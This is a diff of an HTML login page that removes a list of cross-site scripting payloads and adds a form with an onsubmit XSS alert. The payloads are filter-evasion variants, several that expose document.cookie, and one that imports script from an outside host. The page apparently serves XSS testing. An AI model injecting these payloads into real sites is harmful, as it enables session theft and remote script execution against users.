@@ -10,33 +10,6 @@ info:
   </div>
 </div>
 
-<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
-  <rect width="124" height="124" rx="24" fill="#000000"/>
-  <script type="text/javascript">  
-    alert(1);
-  </script>
-</svg>
-
-<img src=x onError=prompt(document.cookie)>
-<img src=x onerroR=alert(document.domain)>
-<img src=x onError=prompt(1)>
-<img src=x onerroR=alert(2)>
-
-%22%3E%3Cimg%2Fsrc=+only=1+OnErRor=x=alert%60XSS%60%3E%3C%21--
-%22%3E%3Cimg/src=x%20onerror=alert(`XSS`)%3E%3C!--
-<img src=x onerror=alert(1)>
-javascript:var{a:onerror}={a:alert};throw%20document.cookie
-<img src=x onerror=prompt(8);>
-rootxravi<onmouseover=alert(document.cookie)//>rootxravi
-rootxravi<onmouseover=alert(1)//>
-<img src=x onError=prompt(document.cookie)>
-<img src=x onerroR=alert(document.domain)>
-Defaulttest><iframe src=javascript:al\u{65}rt(1)>
-<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
-<Img Src=//X55.is OnLoad=import(src)>
-<!--><Svg%20OnLoad=_=confirm,_(document.domain)<!--
-alert;[alert][0].call(this,1)
-
 <!-- Login Form -->
 <div class="heading">
   <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Login Page</h1>
@@ -57,6 +30,12 @@ alert;[alert][0].call(this,1)
     </form>
   </div>
 </div>
+
+<form onsubmit="alert('XSS')">
+  <input type="text">
+  <input type="submit">
+</form>
+
 
 <!-- Footer with your name -->
 <div style="position: fixed; bottom: 10px; right: 10px; font-size: 12px; color: #888;">
